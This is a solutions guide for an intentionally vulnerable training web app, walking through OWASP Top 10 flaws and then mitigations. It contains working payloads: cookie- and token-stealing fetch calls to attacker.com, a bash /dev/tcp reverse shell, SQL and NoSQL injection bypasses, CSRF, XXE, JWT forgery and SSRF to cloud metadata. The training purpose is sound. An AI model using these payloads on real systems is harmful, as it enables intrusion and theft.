# KURUKSHETRA - VULNERABLE WEB APPLICATION SOLUTIONS

This document contains detailed solutions for all vulnerabilities implemented in the application.

## A01: BROKEN ACCESS CONTROL

### Vulnerability 1: Missing CSRF Protection
**Location:** server.js
**Description:** The application doesn't implement CSRF tokens for state-changing operations.
**Exploitation:**
1. Create a malicious HTML page that submits a form to the target endpoint (e.g., /api/users/update-profile)
2. When an authenticated user visits this page, the request will be executed with their session
3. Example: `<form action="http://vulnerable.app/api/users/update-profile" method="POST" id="csrf-form"><input type="hidden" name="email" value="attacker@evil.com"><script>document.getElementById("csrf-form").submit();</script></form>`

### Vulnerability 2: Insecure Direct Object References (IDOR)
**Location:** server/routes/admin.js, server/routes/progress.js
**Description:** The application allows accessing other users' data by changing resource identifiers.
**Exploitation:**
1. Login as a normal user
2. Access /api/admin/users/1 to view user with ID 1 (should be restricted to admins)
3. Send GET request to /api/progress/user/1 to view another user's progress
4. Can also modify the ID to enumerate other user accounts

### Vulnerability 3: Missing Function Level Access Control
**Location:** server/routes/admin.js (delete user endpoint)
**Description:** Admin deletion endpoint is missing the isAdmin middleware check.
**Exploitation:**
1. Login as a normal user
2. Send DELETE request to /api/admin/users/1
3. The endpoint will process the request without verifying admin role

### Vulnerability 4: JWT Stored in localStorage
**Location:** client/src/App.js
**Description:** JWT authentication tokens stored in localStorage are vulnerable to XSS attacks.
**Exploitation:**
1. Find an XSS vulnerability in the application
2. Execute: `fetch('https://attacker.com/steal?token='+localStorage.getItem('token'))`
3. The attacker now has the victim's authentication token

### Vulnerability 5: CORS Misconfiguration
**Location:** server.js
**Description:** When ENABLE_CORS_MISCONFIG is true, the server allows requests from any origin with credentials.
**Exploitation:**
1. Set up a malicious site at attacker.com
2. Create a script that sends authenticated requests to the vulnerable app
3. Due to the CORS config, attacker.com can read the responses
4. Example: `fetch('http://vulnerable.app/api/users/profile', {credentials: 'include'}).then(r => r.json()).then(data => sendToAttacker(data))`

## A02: CRYPTOGRAPHIC FAILURES

### Vulnerability 1: Weak Password Storage (MD5)
**Location:** server/routes/auth.js, server/config/db.js
**Description:** Passwords are hashed using MD5, which is cryptographically broken.
**Exploitation:**
1. Obtain a password hash from the database
2. Use rainbow tables or online MD5 crackers to find the original password
3. Example tools: Hashcat, John the Ripper, or online services like https://crackstation.net/

### Vulnerability 2: Insecure Cookies
**Location:** server.js
**Description:** Cookies are set without secure and httpOnly flags.
**Exploitation:**
1. Find an XSS vulnerability
2. Execute: `document.cookie` to read all cookies
3. Send cookies to attacker's server: `fetch('https://attacker.com/steal?cookie='+document.cookie)`

### Vulnerability 3: Hardcoded Secrets
**Location:** server/middleware/auth.js, docker-compose.yml
**Description:** JWT secret is hardcoded in source code instead of environment variables.
**Exploitation:**
1. Find the JWT_SECRET value in source code
2. Create and sign malicious JWT tokens to impersonate other users
3. Example: `jwt.sign({userId: 1, role: 'admin'}, 'insecure_jwt_secret')`

### Vulnerability 4: Sensitive Data Exposure
**Location:** server/routes/auth.js, server/routes/mfa.js
**Description:** API key and MFA secret are returned in responses.
**Exploitation:**
1. Login as any user and observe the API key in the response
2. Set up 2FA and capture the secret returned in the response
3. Use the key to make API calls bypassing normal authentication
4. Use the MFA secret to generate valid 2FA codes for the account

### Vulnerability 5: JWT Algorithm None
**Location:** (Implemented when ENABLE_JWT_NONE_ALG=true)
**Description:** The application accepts JWT tokens signed with the 'none' algorithm.
**Exploitation:**
1. Take a valid JWT token
2. Decode it, modify the payload (e.g., change role to 'admin')
3. Re-encode it with the 'none' algorithm
4. Use this token to escalate privileges
5. Example: `header = {"alg":"none","typ":"JWT"}; payload = {"userId":1,"username":"user","role":"admin"};`

## A03: INJECTION

### Vulnerability 1: SQL Injection
**Location:** server/routes/auth.js, server/routes/products.js
**Description:** SQL queries are constructed by string concatenation without parameterization.
**Exploitation:**
1. Login with username: `admin' --` (bypasses password check)
2. Search products with: `' OR 1=1 --` (returns all products)
3. Advanced: Use UNION attacks to extract schema information
   Example: `' UNION SELECT 1, name, sql, 4, 5, 6 FROM sqlite_master --`

### Vulnerability 2: NoSQL Injection
**Location:** server/routes/nosql.js
**Description:** MongoDB queries are constructed from user input without validation.
**Exploitation:**
1. Send request to /api/nosql/products with filter={"$where": "return true"}
2. Use NoSQL operators to bypass authentication: login with username[$ne]=null&password[$ne]=null
3. Use filter={"$where": "sleep(5000)"} to test for time-based NoSQL injection

### Vulnerability 3: Command Injection
**Location:** server/routes/admin.js
**Description:** The system-info endpoint passes user input directly to execSync.
**Exploitation:**
1. Access /api/admin/system-info?command=whoami
2. Execute multiple commands: `command=ls -la && cat /etc/passwd`
3. Escalate to reverse shell: `command=bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'`

### Vulnerability 4: Path Traversal
**Location:** server/routes/admin.js
**Description:** The backup endpoint allows specifying arbitrary file paths.
**Exploitation:**
1. Request: `/api/admin/backup?filename=../../../etc/passwd`
2. This creates a copy of the database at an arbitrary location
3. Can be used to overwrite system files or access sensitive data

### Vulnerability 5: Cross-Site Scripting (XSS)
**Location:** Various frontend components that render user input without sanitization
**Description:** User input is rendered directly in the DOM without proper sanitization.
**Exploitation:**
1. Submit feedback with payload: `<script>alert(document.cookie)</script>`
2. When this content is rendered, the script executes in victims' browsers
3. Advanced payload: `<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">`

### Vulnerability 6: XML External Entity (XXE) Injection
**Location:** server/routes/xxe.js
**Description:** XML parser doesn't disable external entity processing.
**Exploitation:**
1. Send XML to /api/xxe/parse with external entity:
```
<?xml version="1.0"?>
<!DOCTYPE foo [
  [email protected]; # this is a comment
  <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user>
  <name>&xxe;</name>
</user>
```
2. The response will include the contents of the /etc/passwd file, demonstrating the XXE vulnerability.

## A04: INSECURE DESIGN

### Vulnerability 1: Weak Password Reset
**Location:** server/routes/auth.js
**Description:** Password reset functionality doesn't verify user identity properly.
**Exploitation:**
1. Request password reset for any email
2. System resets password to a known value without email verification
3. Attacker can take over any account by knowing just the email

### Vulnerability 2: Excessive Data Exposure
**Location:** server/routes/users.js
**Description:** User API returns sensitive data that should be filtered out.
**Exploitation:**
1. Access user profile endpoints
2. Observe that sensitive fields like API keys are included in responses

### Vulnerability 3: Lack of Rate Limiting
**Location:** server/middleware/auth.js
**Description:** Authentication endpoints have no rate limiting or account lockouts.
**Exploitation:**
1. Use a script to attempt multiple login combinations
2. Brute force passwords without any penalty or delay

## A05: SECURITY MISCONFIGURATION

### Vulnerability 1: Revealing Error Messages
**Location:** Multiple routes
**Description:** Error messages include detailed information about the application.
**Exploitation:**
1. Cause an error by submitting invalid data
2. Error response reveals stack traces, file paths, or database schema
3. Use this information to refine attacks against the application

### Vulnerability 2: Default Credentials
**Location:** server/config/db.js
**Description:** Application includes default admin credentials (admin/admin123).
**Exploitation:**
1. Attempt login with common default credentials
2. Gain administrative access to the application

### Vulnerability 3: Unnecessary Features Enabled
**Location:** server.js
**Description:** Debug mode enabled, verbose error reporting, etc.
**Exploitation:**
1. Access application with default configurations
2. Observe detailed error messages and debugging information
3. Use this information to identify vulnerabilities

### Vulnerability 4: Missing Security Headers
**Location:** server.js
**Description:** Application doesn't set important security headers.
**Exploitation:**
1. Examine HTTP responses and note missing headers:
   - Content-Security-Policy
   - X-Frame-Options
   - X-Content-Type-Options
2. Exploit these missing protections for clickjacking, content injection, etc.

## A06: VULNERABLE AND OUTDATED COMPONENTS

### Vulnerability 1: Outdated Dependencies
**Location:** package.json, Dockerfile
**Description:** Application uses outdated libraries with known vulnerabilities.
**Exploitation:**
1. Run a dependency scanner (npm audit, OWASP Dependency Check)
2. Identify vulnerable components
3. Research and exploit known CVEs in those components

### Vulnerability 2: Vulnerable File Upload Component
**Location:** server.js, server/routes/files.js
**Description:** File upload functionality doesn't properly validate files.
**Exploitation:**
1. Upload a malicious file (e.g., .php) disguised as an image
2. Access the file to execute server-side code
3. Gain remote code execution on the server

## A07: IDENTIFICATION AND AUTHENTICATION FAILURES

### Vulnerability 1: Weak Password Requirements
**Location:** server/routes/auth.js
**Description:** No password complexity requirements are enforced.
**Exploitation:**
1. Register accounts with extremely weak passwords (e.g., "123")
2. Easily guess or brute force other users' passwords

### Vulnerability 2: Insufficient Authentication
**Location:** server/middleware/auth.js
**Description:** API key authentication lacks proper security controls.
**Exploitation:**
1. Extract API key from responses or database
2. Use key to bypass normal authentication flows
3. Access restricted functionality

### Vulnerability 3: Session Fixation
**Location:** server/routes/auth.js
**Description:** Sessions aren't regenerated on login/privilege changes.
**Exploitation:**
1. Obtain a session identifier (could be your own)
2. Trick victim into using this session ID
3. When victim authenticates, attacker's session becomes authenticated

### Vulnerability 4: User Enumeration
**Location:** server/routes/auth.js
**Description:** Login errors reveal whether username exists or password is wrong.
**Exploitation:**
1. Attempt login with various usernames
2. Different error messages indicate if username exists
3. Create a list of valid usernames for password attacks

## A08: SOFTWARE AND DATA INTEGRITY FAILURES

### Vulnerability 1: Lack of Integrity Checking
**Location:** server/routes/admin.js
**Description:** Admin import function doesn't verify source of configuration data.
**Exploitation:**
1. Set up malicious config server
2. Convince admin to import from your server
3. Insert malicious configuration that compromises the application

### Vulnerability 2: Insecure Deserialization
**Location:** server/routes/config.js
**Description:** Application deserializes user-provided data without validation.
**Exploitation:**
1. Create malicious serialized object
2. Submit to deserialization endpoint
3. Trigger remote code execution through object methods

## A09: SECURITY LOGGING AND MONITORING FAILURES

### Vulnerability 1: Insufficient Logging
**Location:** server.js, various routes
**Description:** Critical operations aren't properly logged.
**Exploitation:**
1. Perform sensitive operations (password changes, admin actions)
2. Notice lack of audit trail in logs
3. Abuse functionality without detection

### Vulnerability 2: Verbose Error Logging
**Location:** server/middleware/auth.js
**Description:** Error messages expose sensitive information.
**Exploitation:**
1. Trigger authentication errors
2. Observe detailed error messages with sensitive information
3. Use this information to refine attacks

### Vulnerability 3: No Intrusion Detection
**Location:** All routes
**Description:** No mechanisms to detect or block suspicious activity.
**Exploitation:**
1. Perform rapid-fire requests or credential stuffing
2. Execute SQL injection or XSS attacks
3. Note that application doesn't detect or block malicious activity

## A10: SERVER-SIDE REQUEST FORGERY (SSRF)

### Vulnerability 1: Unvalidated URL in Import Function
**Location:** server/routes/admin.js
**Description:** Admin import feature fetches data from user-provided URLs.
**Exploitation:**
1. Request import from internal URL: `http://localhost:5000/api/users`
2. Access internal services: `http://169.254.169.254/latest/meta-data` (AWS)
3. Scan internal network: `http://192.168.1.1`

### Vulnerability 2: Webhook Functionality
**Location:** server/routes/config.js
**Description:** Webhook configuration allows specifying arbitrary URLs.
**Exploitation:**
1. Configure webhook to internal service: `http://localhost:8080/admin`
2. Extract data from internal services
3. Use server as proxy to access otherwise inaccessible resources

## MITIGATION STRATEGIES

For each vulnerability category, here are the proper mitigation strategies:

1. **Broken Access Control**
   - Implement proper RBAC (Role-Based Access Control)
   - Use CSRF tokens for all state-changing operations
   - Validate user permissions for each request
   - Deny by default; require explicit grants

2. **Cryptographic Failures**
   - Use strong password hashing (bcrypt, Argon2)
   - Set secure and httpOnly flags on cookies
   - Store secrets in environment variables or secure storage
   - Implement proper TLS configuration

3. **Injection**
   - Use parameterized queries for SQL
   - Validate and sanitize all user inputs
   - Use safe APIs for command execution
   - Implement content security policy (CSP)

4. **Insecure Design**
   - Implement multi-factor authentication
   - Use secure password reset with time-limited tokens
   - Apply rate limiting and account lockouts
   - Follow secure design principles

5. **Security Misconfiguration**
   - Use security headers (CSP, HSTS, etc.)
   - Disable debug features in production
   - Change default credentials
   - Apply least privilege principle

6. **Vulnerable Components**
   - Regularly update dependencies
   - Monitor for CVEs
   - Use a software composition analysis tool
   - Remove unused dependencies

7. **Authentication Failures**
   - Enforce strong password policies
   - Implement MFA
   - Regenerate session IDs on login
   - Use consistent error messages

8. **Software Integrity**
   - Verify integrity of data sources
   - Use digital signatures
   - Avoid insecure deserialization
   - Validate updates and patches

9. **Logging & Monitoring**
   - Log all security-relevant events
   - Implement centralized logging
   - Set up alerts for suspicious activity
   - Don't log sensitive information

10. **SSRF**
    - Validate and sanitize user-supplied URLs
    - Use allowlists for permitted domains
    - Implement network-level protections
    - Restrict outbound connections

Remember that this application is intentionally vulnerable for educational purposes. Never deploy it in a production environment or on publicly accessible servers.
